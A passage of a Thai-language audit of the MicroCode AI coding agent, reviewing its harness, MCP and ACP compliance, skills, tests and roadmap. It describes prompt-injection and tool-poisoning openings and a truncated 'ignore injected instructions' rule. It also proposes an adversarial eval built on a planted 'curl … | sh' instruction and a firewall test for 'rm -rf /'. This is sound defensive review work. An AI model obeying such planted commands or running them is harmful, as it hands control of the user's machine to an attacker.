- **Telemetry มีตัวเลขที่ไม่ได้มาจากการวัด** ✅: `totalTokensSavedByShield` คืนค่า `18_420` เมื่อค่าจริงเป็น 0 (:229-232), schema savings คิดเป็น `pruned × 145` และ X-Ray ใช้ chars/4 หารด้วย 128K ที่ hardcode ไว้
- Local LLM synthesis เขียน**ตัวอย่างโปรแกรมสำเร็จรูป**ลงไปแทนเมื่อโค้ดจากโมเดลคอมไพล์ไม่ผ่าน (:5495-5507)

### 2.4 สิ่งที่ทำได้ดี

- `StreamContinuationGate` (:32-67) resume ได้ครั้งเดียวแน่นอนและมี idle watchdog (180s ก่อน token แรก, 90s ระหว่าง stream)
- คู่ tool_use/tool_result ไม่หลุดจากกันหลัง compaction (`alignAtomicToolBoundary`) และ adapter ลดระดับ result ที่ไม่มีคู่ให้เป็นข้อความธรรมดา
- มี stall guard แบบ deterministic ได้แก่ identical-failure counter, batch fingerprint และการตรวจ A↔B oscillation (:3557-3611)
- Pin workspace ต่อ run ด้วย `@TaskLocal` และ approval ตรวจซ้ำว่า workspace ไม่ได้เปลี่ยนระหว่างรอ

---

## 3. Tools และ Harness

- **Tool surface ใหญ่และซ้ำซ้อน:** มี tool ราว 44 ตัวเป็นค่าเริ่มต้นและได้ถึงราว 70 ตัวเมื่อเปิด device tier บวก MCP อีก 12 ตัว ในจำนวนนี้มี edit tool 5 ตัว, plan tool 2 ตัว, sub-agent tool 6 ตัว และ computer-use 3 ช่องทาง
  - `ToolScope` เทียบ keyword `"ui"` แบบ substring จึงเจอใน "build", "guide", "require" ทำให้ device tier ที่มี `computer_use` ถูกเปิดแทบทุกครั้ง (`ToolScope.swift:54`)
  - tool ที่ไม่อยู่ใน scope แต่ถูกเรียกจะถูกขยาย scope ให้แล้วรันต่อ (`AgentService.swift:3057-3061`) ToolScope จึงไม่ใช่ขอบเขตความปลอดภัยจริง
- **Plan mode เป็นแค่ข้อความใน prompt:** ตรวจด้วย `content.contains("[PLAN MODE")` และ edit tool ยังเรียกใช้ได้ตามปกติ (:2220)
- **Parameter smuggling:** string param ที่ parse เป็น JSON object ได้จะถูก merge เข้าระดับบนสุด ผลคือ `file_write` ของไฟล์ JSON ที่มี key `"path"` จะเขียนไปที่ path อื่น (`AgentToolBox.swift:229-241`)
- **Edit tool:**
  - ไม่มีการตรวจว่าต้องอ่านก่อนเขียนหรือตรวจ mtime ทำให้ไม่จับ stale edit
  - แปลง CRLF เป็น LF ทั้งไฟล์แบบเงียบๆ (:3401)
  - ไม่มี diff preview ในหน้าต่าง approval
- **Undo/checkpoint:** ใช้ `git stash create` และ `git add -u` ซึ่ง**ไม่เก็บไฟล์ untracked** ส่วน workspace ที่ไม่ใช่ git ไม่มี checkpoint เลย และ `find`/`env`/`awk` ถูกนับเป็น read-only จึงข้าม checkpoint
- **Sub-agent:**
  - `type_name` ที่ไม่รู้จักได้ `allowedTools ["*"]`
  - sub-agent ทุกตัวได้ `swarm_orchestrator` ซึ่ง spawn ได้ครั้งละ 6 ตัว **โดยไม่มี depth limit หรือ global cap**
  - งบเริ่มต้นต่อตัวคือ 1M token, 100 model call และ 300 tool call (`SubAgentHarness.swift:186-192, 305, 331-333, 1567`)
- **"Verified" ผ่านง่ายเกินไป:** แค่รัน `python3 <อะไรก็ได้>`, `curl` หรือ `npm run dev` ก็นับเป็นหลักฐาน (`AgentExecutionEvidence.swift:257-271`)
- **ไม่มีการป้องกัน prompt injection:** output จาก tool, เว็บ, OCR และ MCP ถูกต่อเข้า conversation เป็นข้อความธรรมดา ไม่มีการระบุที่มา
- **Observability:** ประวัติ tool call และ approval อยู่ในหน่วยความจำเท่านั้น (สูงสุด 300 รายการ) ไม่มี trace แบบถาวร

**สิ่งที่ทำได้ดี**
- `WorkspacePathPolicy.contains` จัดการ symlink และ `..` ได้ถูกต้องและมี regression test
- Approval แบบ fail-closed (หมด 60s ถือว่าปฏิเสธ)
- Kill process ทั้ง tree แบบ SIGTERM ตามด้วย SIGKILL
- `replace_in_file` ต้อง match แบบ exact และไม่ซ้ำกัน
- allow-list ของ sub-agent ถูกบังคับใช้ตอนเรียก tool จริง

---

## 4. MCP

### 4.1 สถานะเวอร์ชัน

สเปกล่าสุดคือ **2026-07-28** (ออก 28 ก.ค. 2026) ก่อนหน้านั้นคือ 2025-11-25 แต่โค้ดในโปรเจกต์รองรับสูงสุดแค่ 2025-06-18 ✅

| Component | Version ในโค้ด |
|---|---|
| Swift `MCPServer` | echo กลับ 2025-06-18 / 2025-03-26 / 2024-11-05 (`MCPServer.swift:366-367`) แต่ `/v1/status` ประกาศ 2024-11-05 |
| `mcp-server.py` | ค่าเริ่มต้น 2024-11-05 |
| Rust gateway / client | 2024-11-05 แบบ hardcode และไม่มี negotiation (เป็น dead code ส่วนใหญ่) |
| `ExternalMCPManager` (client) | ส่ง 2025-06-18 แต่ไม่ตรวจ version ที่ server ตอบกลับ |
| `MCPClient` (local Python) | ส่ง `initialize` โดยไม่ใส่ params เลย |

### 4.2 Compliance matrix (ย่อ)

| ฟีเจอร์ | สถานะ |
|---|---|
| initialize / initialized | Partial: ตอบ notification เป็น response และรับ id ได้แค่ `Int` (string id ทำให้เกิด Parse error) |
| ping | ผิดรูปแบบ (คืน `{"status":"pong"}` แทนที่จะเป็น `{}`) |
| Capabilities | ประกาศ `listChanged` และ `logging` ไว้แต่ไม่ได้ implement |
| tools: pagination / annotations / `outputSchema` / `structuredContent` | Missing |
| prompts/get, resources (`workspace://active-file` คืนแค่ placeholder) | Partial |
| progress, cancellation, completion, elicitation, sampling | Missing |
| Streamable HTTP (server) | Missing: GET แบบ "SSE" ส่ง endpoint แล้วปิดทันที และไม่มี session/version header |
| Streamable HTTP (client) | Partial: ไม่ส่ง `MCP-Protocol-Version`, ไม่มี GET stream และไม่มี DELETE |
| OAuth 2.1 / Protected Resource Metadata / CIMD | Missing (401 กลายเป็นแค่ข้อความ error) |
| `notifications/tools/list_changed` | **Bug:** ไปตรวจใน `if let reqId = json["id"]` ซึ่ง notification ไม่มี id จึงไม่เคย refresh (`ExternalMCPManager.swift:362-375`) |
| Request จาก server ที่ไม่รองรับ | ไม่ตอบ -32601 ทำให้ server ค้างรอจน timeout |

### 4.3 ความทนทาน (robustness)

- Bridge รับข้อมูลแค่ครั้งเดียวไม่เกิน 64 KB ทำให้ `write_file` ที่ใหญ่ถูกตัด (`MCPServer.swift:1413`)
- URLRequest timeout ฝั่ง client คือ 12s แต่ `tools/call` ให้เวลา 60s
- **Race ตอน restart:** termination handler ของ process เก่าไปทำให้ `initialize` ของ process ใหม่ล้มเหลว และเกิด auto-restart โดยไม่ตั้งใจ แก้ได้ด้วย generation id
- ปุ่ม Stop ของ MCP server ไม่ได้หยุดจริง เพราะ `handleRequest` ไม่เช็ก `isRunning` และ UI แสดงว่ามี 8 tool ทั้งที่เรียกได้ราว 34 ตัว
- Tool description จากบุคคลที่สามถูกส่งเข้าโมเดลตามที่ได้รับมา และไม่มี hash หรือ change detection ของ manifest (เสี่ยง tool poisoning) ชื่อ tool ก็ไม่ถูก sanitize ตาม `^[A-Za-z0-9_-]{1,64}$`

### 4.4 แผน migration

**Stage A (ทำได้ทันที): รวมให้เหลือ server เดียว แล้วตั้งเป้าที่ 2025-11-25**
- ให้ Swift เป็นตัวหลักสำหรับแอป, ลด `mcp-server.py` เหลือ shim แปลง stdio เป็น socket ส่วน Rust gateway/client ให้คงไว้ (อาจถูกระบบภายนอกใช้อยู่) แต่ปรับ protocol version และ behavior ให้ตรงกับ Swift
- ทำ Streamable HTTP ให้ถูกต้อง, รองรับ string id, ไม่ตอบ notification และเพิ่ม pagination, annotations (`readOnlyHint`/`destructiveHint`), `outputSchema`/`structuredContent`
- Client: ส่ง `MCP-Protocol-Version`, ตรวจ version ที่ negotiate ได้ และทำ OAuth (PRM, PKCE, Client ID Metadata Documents และตรวจ `iss` ตาม RFC 9207)

**Stage B: เพิ่ม version-dispatch layer สำหรับ 2026-07-28**
- รองรับ stateless request ที่ใส่ version และ capabilities ใน `_meta` ทุก request, `server/discover`, `resultType: "complete" | "input_required"` (MRTR) และ header `Mcp-Method`/`Mcp-Name`
- ใช้ `subscriptions/listen` แทน GET stream
- ใส่ `ttlMs`/`cacheScope` ใน list result และเรียง `tools/list` แบบ deterministic
- เลิกพึ่ง Roots/Sampling/Logging ซึ่ง deprecated แล้ว
- client รุ่นเก่ายังใช้ initialize handshake ได้ตามเดิม

**สิ่งที่ทำได้ดี**
- Bridge bind เฉพาะ loopback และตรวจ Host header กัน DNS rebinding พร้อม Origin allow-list
- Rust backend ใช้ local token ยาว ≥32 ตัวอักษรเทียบแบบ constant-time และถอด token ออกจาก env ของ child process
- โหลด tool แบบ lazy: inject ได้สูงสุด 12 tool ต่อ prompt, มี `search_tools` และ hibernate server พร้อม manifest cache

---

## 5. ACP (Agent Client Protocol ของ Zed)

**ข้อเท็จจริง:** ACP ที่ใช้คือ Agent Client Protocol (JSON-RPC 2.0 แบบ NDJSON ผ่าน stdio, protocolVersion 1) แต่**มีเพียง Goose หรือ agent ที่มี `-acp` อยู่ใน args เท่านั้นที่คุยผ่าน ACP จริง** agent ที่เหลือทั้งหมด (Claude Code, Codex, Gemini, AGY, OpenCode) เป็น headless CLI ที่ระบบ parse stream เอง ส่วน `ACPGhostTextBridge` และ `AgentContextProtocolBridge` **ไม่ใช่ ACP**

### 5.1 Compliance matrix (ย่อ)

| รายการ | Host (MicroCode เป็น client) | Server (MicroCode เป็น agent) |
|---|---|---|
| initialize | ส่งไปแต่ไม่สนใจ response | ประกาศ capability เกินจริง (`loadSession`, `image`, MCP http/sse) |
| authenticate | Missing | Stub |
| session/new | Partial | ไม่สนใจ `mcpServers` และไม่ตรวจ cwd |
| session/load | Missing | ไม่ replay history |
| ContentBlocks | text อย่างเดียว | ทิ้ง image และ resource_link |
| tool_call_update (diff/locations) | ทิ้ง | ไม่ส่ง |
| plan, available_commands_update, current_mode_update | ไม่รองรับหรือถูกแปลงเป็น string แบนๆ | Missing |
| **session/request_permission** | **ใช้งานไม่ได้:** ตอบ optionId แบบ hardcode `allow_once`/`reject_once` แต่ไม่เก็บ `options` ที่ agent ส่งมา | ไม่เคยส่ง |
| fs/write_text_file | **ไม่มีการตรวจใดๆ** (ข้าม review, checkpoint และ scope guard) | ไม่เคยใช้ fs ของ client |
| terminal/create | **ไม่มีการตรวจ:** ต่อ args เข้า `zsh -lc` โดยไม่ quote และไม่ผ่าน firewall | ไม่ใช้ |
| session/cancel | ฆ่า process ทิ้งทันที | ใช้ได้ |
| request ที่ไม่รู้จักจาก agent | ไม่ตอบกลับ ทำให้ agent ค้าง | ตอบ -32601 ถูกต้อง |

### 5.2 Bug สำคัญ

- **Persistent turn ไม่เคยปิด stream:** `.complete` ไม่เรียก `finish()` ทำให้ `for await` ใน AIAgentView และ SubAgentHarness ค้าง (`ACPProtocol.swift:603`; `ACPHostService.swift:1438`)
- **โหมด server ทำ stdout ปนเปื้อน:** server รันอยู่ในแอป SwiftUI เต็มตัวซึ่งมี `print()` 349 จุด ขณะที่สเปกกำหนดว่า stdout ต้องมีแต่ข้อความ ACP เท่านั้น
- เมื่อมี prompt ที่ 2 เข้ามา `activePromptTasks[sid]` ถูกเขียนทับ ทำให้มี loop รัน 2 ตัว และเมื่อชน limit ระบบคืน `end_turn` แทน `max_turn_requests`
- README อ้างว่ามี WebSocket transport, `⌘↵` permission gate และ completion ที่มาจาก ACP แต่**ไม่มีอยู่จริงทั้ง 3 อย่าง**

### 5.3 ฟีเจอร์ ACP v1 ที่ stabilize แล้วแต่ MicroCode ยังไม่มี (ข้อมูลถึง พ.ย. 2026)

- **Session config และ lifecycle:** session config options (models/modes/reasoning, `model_config`, boolean), `session/list`, `session/resume`, `session/close`, `session/delete`, `logout`, `additionalDirectories`
- **Session update:** `session_info_update`, **`usage_update`** (context size และ cost), `messageId` บน chunk, `$/cancel_request`, tool call `name`
- **ปฏิสัมพันธ์กับผู้ใช้และ prompt:** **Elicitation** (form และ URL), **client-provided `systemPrompt`**
- **Registry:** **ACP Registry** สำหรับ discover และติดตั้ง agent
- **อื่นๆ:** ACP v2 (draft 20 ก.ค. 2026) และ SDK Rust/TS ที่ออก 1.0.0 แล้ว (โค้ดปัจจุบันสร้าง `[String: Any]` เองทั้งหมด)

### 5.4 แผน

1. ทำ permission ให้ครบทั้งเส้นทาง: เก็บ `options`, แสดงใน AIAgentView, ตอบด้วย `optionId` จริง, ส่ง `cancelled` เมื่อผู้ใช้กด stop และลบการ auto-approve ใน SubAgentHarness
2. สร้าง request layer: pending map ที่อิง id, ตอบ -32601, แยก stream ทีละ turn, cancel โดยไม่ฆ่า process และใช้ Codable type ที่ generate จาก schema ของ ACP 1.0
3. ทำ entry point แบบ headless สำหรับ `--acp-server` (ไม่มี WindowGroup และ dup2 stdout ไปที่ stderr)
4. รัน Claude/Codex/Gemini ผ่าน ACP adapter จริง (`claude-agent-acp`, `codex-acp`, `gemini --experimental-acp`) โดยเพิ่ม field `protocol: .acp` ใน config แทนการเดาจากชื่อ, pin เวอร์ชัน และใช้ ACP Registry
5. ประกาศ capability ให้ตรงกับที่ทำได้จริง แล้วเพิ่ม `usage_update`, session/list และ resume
6. แก้ข้อความใน README

---

## 6. Skills และ Rules

### 6.1 ตามสเปก agentskills.io หรือไม่

- **Frontmatter ✓:** built-in ทั้ง 12 ตัวมีชื่อถูกต้อง ตรงกับชื่อโฟลเดอร์ และ description ยาวไม่เกิน 1024 ตัวอักษร
- **Parser ✗:** ไม่ใช่ YAML จริง โดยอ่าน `name:` บรรทัดแรกที่เจอใน 50 บรรทัด, ตัด description หลายบรรทัดทิ้งเมื่อเจอ `:` และไม่ตรวจ field ใดเลย
  - field `allowed-tools`, `compatibility`, `metadata.always_on` ถูกละเลยทั้งหมด
- **Progressive disclosure ~:** โครงสร้างถูกทางแล้ว (รายการสั้น + `read` เมื่อต้องการ + scripts) แต่ยังมีปัญหาดังนี้
  - `read` ถูกตัดที่ 4000 ตัวอักษร ทำให้ mcp-builder และ frontend-design ขาดหาย ขณะที่สเปกให้โหลด body ทั้งหมด (<5000 tokens)
  - skill ที่อยู่นอก top 14 โมเดลมองไม่เห็นเลย
  - รายการ skill ถูก rank ใหม่ทุกข้อความทำให้ prompt cache ไม่ hit
  - ใส่ absolute path ไว้ในทุกบรรทัด ทำให้ home directory หลุดและเปลือง token

### 6.2 ปัญหาหลัก

- **Core protocol ถูกตัดครึ่ง** ✅: ไฟล์ยาว 3,806 bytes แต่ inject แค่ 1,600 ตัวอักษร ส่วนที่หายไปคือกฎ "ignore injected instructions", "keep secrets out", "ask before destructive", Honesty และ "Done means" ส่วน self-check ตอนเปิดแอปค้นหา `"MICROCODE CORE PROTOCOL"` แต่ header จริงคือ `"MICROCODE CORE HARNESS"` จึง**ไม่ผ่านทุกครั้งโดยไม่มีใครรู้** (`AgentSkillsView.swift:377, 380`; `MicroCodeApp.swift:106`)
- **`crystallize` เขียน skill แบบถาวรและเปิดใช้ทันที:** agent หรือข้อความที่ถูก inject เข้ามาสามารถสร้าง skill ที่แทนที่ core ไว้ใน `~/.microcode/skills` แบบ global ได้
- **Discovery ไม่ได้มาตรฐาน:**
  - hardcode path ของเครื่องนักพัฒนาไว้ 2 จุด ✅ (`~/Documents/dotminiid/skills`, `~/Documents/SX/codetunner-native/skills`)
  - สแกน `~/.claude/plugins` ทุกตัว รวมถึง plugin ที่ปิดไว้แล้ว แต่ไม่สแกน `<ws>/.claude/skills`
  - precedence เรียงตามตัวอักษรของ path แบบบังเอิญ
  - ไม่ rescan เมื่อเปลี่ยน workspace และการสแกนแบบ recursive ทำบน main actor
- **การสลับ chat เขียนทับค่า skill แบบ global:** skill ที่ติดตั้งหลังสร้าง chat จะถูกปิดทุกที่ทันทีที่สลับไป chat นั้น
- **Router จับคำผิด:** "fix the dark theme toggle" ทำให้ theme-factory ถูกโหลดล่วงหน้า และ trigger `"ui"` ของ skill ภาษาไทยไป match คำอย่าง "build"
- **Rules ถูก inject ซ้ำ 2–3 รอบ:** ProjectMemoryService (สูงสุด 8,000 ตัวอักษรต่อไฟล์) + MultiPlatformRulesEngine (800 token) + `agent.md` อีกรอบ ผลคือ `rules.md` จาก `/learn` หลุดออกนอก budget และ AGENTS.md ที่อยู่ในโฟลเดอร์ย่อยไม่เคยถูกใช้ (scope pattern เป็น relative path แต่ path ของไฟล์ที่เปิดเป็น absolute)
- **Slash command:** มี 19 ตัวแบบตายตัว ไม่รองรับ `.claude/commands` หรือ `$ARGUMENTS` และเรียก skill ด้วย `/skill-name` ไม่ได้
- **คุณภาพ skill ใหม่:** `agent-desktop` และ `openthai-ocr` มีตัวเลข benchmark และ "100%" ซึ่งขัดกับกฎใน `microcode-skill-authoring` ของโปรเจกต์เอง ทั้ง 2 ตัวไม่อยู่ใน NOTICE.md และ UI ติดป้ายว่าเป็น "Anthropic Skills"

### 6.3 แผน

1. **Trust model:** สงวน `microcode-*`, ต้องยืนยันก่อนใช้ project skill และ skill จาก crystallize ให้ปิดไว้เป็นค่าเริ่มต้นพร้อมแสดง diff
2. **Inject core protocol ให้ครบ** (ราว 800 token) และแก้ string ของ self-check
3. **`run_script` ต้องเป็น dangerous:** ผ่าน firewall และจำกัด path ไว้ในโฟลเดอร์ skill
4. **รวม rules เหลือ pipeline เดียว:** dedupe ตาม canonical path, กำหนด precedence ให้ชัด, แสดง budget ใน UI, ใช้ AGENTS.md ที่ใกล้ไฟล์ที่สุด และทำให้ import ปลอดภัยต่อ symlink
5. **ทำ loader ให้ตรงสเปก:** ใช้ YAML parser จริง, ตรวจด้วย `skills-ref validate`, สแกน `<ws>/.claude/skills`, rescan เมื่อเปลี่ยน workspace, ทำรายการ skill ให้คงที่เพื่อให้ cache ได้, ให้ `read` คืน body ทั้งหมด และรองรับ `/skill-name`

---

## 7. สถาปัตยกรรมและการลดความซ้ำซ้อน

**Chat หลักในแอปรันผ่าน loop ฝั่ง Swift (`AgentService`)** และใช้ `agent_kernel.rs` เป็น run supervisor/checkpoint ผ่าน HTTP ส่วน **`agent.rs` เป็นสะพานเชื่อมกับหลายระบบภายนอก (ยืนยันจากเจ้าของโปรเจกต์)** แม้ view ใน Swift จะไม่ได้เรียกใช้ก็ตาม จึงต้องดูแลต่อในฐานะ integration surface และไม่ควรลบ

| สิ่งที่ซ้ำ | Swift | Rust |
|---|---|---|
| Agent loop | `AgentService` (หลัก), `SubAgentHarness` | `agent.rs` มี 3 ชุด (`enhanced_chat`, `enhanced_chat_stream`, `run_agent_loop_stream`) ใช้เชื่อมระบบภายนอก แต่เส้นทางที่เรียกจาก Swift (`AppState.sendChatMessage`) ใช้งานไม่ได้ เพราะ `agentSessionId` ไม่เคยถูกกำหนดค่า ทำให้ได้ "Session not found" + CLI `agent_loop.rs` ที่ไม่ถูก build |
| Provider adapter | `AIClient.swift` (native tool ครบ) | `ai.rs` (text อย่างเดียว ไม่มี tool protocol), `llm/*` (ไม่ได้ใช้) |
| Tool schema | ราว 70 tool (`file_read`, `replace_in_file`, `shell`) | 18 tool (`read_file`, `edit_file`, `run_command`) ซึ่งเป็นชื่อต่างกัน |
| Hooks / Policy | `MultiPlatformRulesEngine`, `ToolApprovalModels` | `hooks.rs`, `policy.rs` (ใช้เฉพาะใน loop ที่เป็น dead code) |
| MCP server | `MCPServer.swift` | `gateway.rs` (ไม่ได้ใช้) + `mcp-server.py` |

**ข้อเสนอ**
1. **คง `agent.rs` ไว้เป็น integration bridge แต่ hardening ให้ทนทาน:** ใส่ timeout ให้ reqwest client, ยกเลิก loop เมื่อ client หลุด, แก้จุดที่ panic (`lines[start..end]`, `RwLock.unwrap`), ย้าย Gemini key ไปไว้ใน header `x-goog-api-key`, ใช้ native tool protocol ของแต่ละ provider, แก้ policy bypass ที่ :1754 และแก้ `agentSessionId` ฝั่ง Swift ส่วนการรวม logic ให้แชร์ tool schema/policy ชุดเดียวกับ Swift (ข้อ 3) ทำได้โดยไม่ต้องลบไฟล์นี้
2. **เก็บ `agent_kernel` ไว้แต่เรียกแบบ in-process ผ่าน uniffi:** แทนการเรียก HTTP ที่ timeout 0.12s ซึ่งพังครั้งเดียวก็ทำให้ kernel ถูกปิด 120s เพิ่ม mutex ต่อ run และใช้ไฟล์ tmp ที่ไม่ซ้ำกัน
3. **Tool schema registry ชุดเดียว:** เก็บ JSON Schema ใน Resources ให้ `AgentToolBox`, `MCPServer` และ CLI ใช้ร่วมกัน พร้อมตาราง alias และใช้ policy/hook engine กับ model/pricing catalog แบบ live ชุดเดียวเช่นกัน
4. **แตก `executeIsolatedRunMessage` ออกเป็น `AgentRun` actor** ที่มีขั้นตอน `plan → callModel → executeTools → evaluate` และย้าย SSE parsing ออกจาก MainActor
5. **ทำตามแนว "decouple brain from hands"** ([Anthropic Managed Agents, เม.ย. 2026](https://anthropic.com/engineering/managed-agents)):
   - ให้ทุก tool ผ่าน interface `execute(name, input)` เดียว
   - เก็บ session เป็น **append-only event log** แยกจาก context window เพื่อให้ resume และ replay ได้ และ compaction ไม่ทำให้ข้อมูลหายถาวร (ปัจจุบัน Token Shield เขียนทับ transcript)
   - ไม่ให้ credential เข้าไปอยู่ใน sandbox

---

## 8. Tests และ Evals (สำคัญที่สุดในระยะยาว)

**สถานะ:** Package.swift มี `testTarget` **0 ตัว** ✅ มี Swift test file 0 ไฟล์ และ Rust มี test ราว 30 ตัวที่ไม่ได้ครอบ loop ส่วน `benchmarks/*.py` วัดแค่ประสิทธิภาพ editor (cold start, typing latency) ซึ่ง**ไม่ใช่การวัดคุณภาพของ agent**

harness ที่มี heuristic มากแบบนี้แก้ไม่ได้อย่างปลอดภัยถ้าไม่มี regression test เห็นได้จากการที่ diff ล่าสุดเพิ่ม nag และผ่อน repetition guard ลงโดยไม่มีอะไรวัดผลกระทบ

**ข้อเสนอ**
1. **เพิ่ม XCTest target แล้วเขียน unit test ให้:**
   - `AIStructuredTurnCodec` และ adapter ของแต่ละ provider (คู่ tool_use/tool_result, `thoughtSignature`)
   - `alignAtomicToolBoundary` และ compaction
   - `parseTextBasedToolCalls` ทั้ง negative case (ต้องไม่ parse ข้อความที่อยู่ใน code fence) และ case ภาษาไทย
   - `apply_patch`, `validateSandbox`, shell guard และ firewall regex (เช่น `rm -rf /`)
   - codec ของ ACP/MCP JSON-RPC และ frontmatter parser ของ skill
2. **Fake-provider loop test:** ใช้ provider จำลองที่ตอบตาม script เพื่อทดสอบว่า loop จบเมื่อได้ `end_turn`, ไม่รัน tool ซ้ำหลัง retry และกู้จาก context overflow ได้
3. **Agent eval suite:** งาน 30–100 ข้อที่ตรวจผลอัตโนมัติได้ เช่น repo ขนาดเล็กที่มี test ที่ fail อยู่ ทั้ง Swift/TS/Python และ prompt ภาษาไทย แล้ววัด pass@1, จำนวน turn, cost, จำนวน nag และจำนวนครั้งที่ approval ถูกขอ ใช้เป็น **gate ใน CI** ก่อน merge การแก้ harness
   - เพิ่มชุด **adversarial eval** สำหรับ prompt injection (README หรือ tool output ที่สั่งให้รัน `curl … | sh`)
4. **ตัดตัวเลขที่ไม่ได้มาจากการวัดออก** (เช่น `18_420`) และให้ telemetry อ่าน usage จาก provider จริง

---

## 9. Roadmap ที่แนะนำ

| Phase | ระยะเวลาโดยประมาณ | งาน |
|---|---|---|
| **0: หยุดเลือดไหล** | 1–2 สัปดาห์ | Workspace Trust Gate (MCP config, hooks, skills, policy, rules), token บน `:18888` + approval สำหรับ execute/computer-use, แก้ `apply_patch` path, หยุด detokenize ใน shell, ปิด text-parse สำหรับ provider ที่มี native tool, ACP permission UI + เอา bypass flag ออก, `microcode-agent` auth, แก้ `web_fetch`, inject core protocol ให้ครบ, **revert diff ที่เพิ่ม nag** |
| **1: Loop ที่ถูกต้อง** | 2–4 สัปดาห์ | ให้ `stop_reason` เป็นตัวตัดสิน, retry ชั้นเดียวและไม่ retry หลัง emit tool call, `is_error` สำหรับ JSON ที่เสีย, แยก `AgentRun` state, ทำ system/tool prefix ให้คงที่เพื่อ cache, budget ตาม context window ของโมเดล, structured compaction, XCTest target + fake-provider test |
| **2: Protocol** | 3–6 สัปดาห์ | MCP: รวมเหลือ server เดียว + 2025-11-25 + OAuth แล้วตามด้วย 2026-07-28 แบบ version-gated ส่วน ACP: request layer + generate type จาก SDK schema + adapter จริง + Registry + `usage_update`/resume/list + headless server |
| **3: Harness ขั้นสูง** | ต่อเนื่อง | `sandbox-exec` สำหรับ shell, tool surface ราว 15 core tool + tool search, plan mode ที่บังคับจริง, edit tool ที่ตรวจ stale read + diff ใน approval, sub-agent depth = 1 + global cap, checkpoint ที่รวมไฟล์ untracked, event log แบบถาวร + replay, แยก evaluator ออกจาก generator (ดู [Anthropic harness design, มี.ค. 2026](https://www.anthropic.com/engineering/harness-design-long-running-apps)), eval suite เป็น CI gate, hardening `agent.rs` (timeout, cancel, panic, native tool protocol) |

---

## 10. เอกสารที่ข้อความไม่ตรงกับโค้ด

- `CLAUDE.md` ยังอธิบายโปรเจกต์ว่าเป็น "CodeTuner" และบอกว่า "Code execution is sandboxed" ซึ่ง**ไม่จริง** (ไม่มี OS sandbox)
- README อ้างถึง ACP WebSocket transport, `⌘↵` permission gate และ GhostText ที่มาจาก ACP ซึ่งไม่มีอยู่จริงทั้งหมด
- UI บอกว่า rules ถูกใช้ "shared identically… Rust Engine" แต่ `rules.rs` ไม่อ่าน AGENTS.md หรือ CLAUDE.md
- `/learn` บอกว่าเขียนลง `.microcode/rules.md` แต่จริงๆ เขียนลง `~/.microcode/workspaces/<id>/rules.md`

---

## แหล่งอ้างอิง

- [MCP 2026-07-28 Changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog)
- [ACP Updates](https://agentclientprotocol.com/updates) · [ACP v2 draft](https://agentclientprotocol.com/announcements/acp-v2-draft)
- [Agent Skills Specification](https://agentskills.io/specification)
- [Anthropic: Harness design for long-running application development (มี.ค. 2026)](https://www.anthropic.com/engineering/harness-design-long-running-apps)
- [Anthropic: Scaling Managed Agents: Decoupling the brain from the hands (เม.ย. 2026)](https://anthropic.com/engineering/managed-agents)
- [Anthropic: Effective harnesses for long-running agents (พ.ย. 2025)](https://anthropic.com/engineering/effective-harnesses-for-long-running-agents)
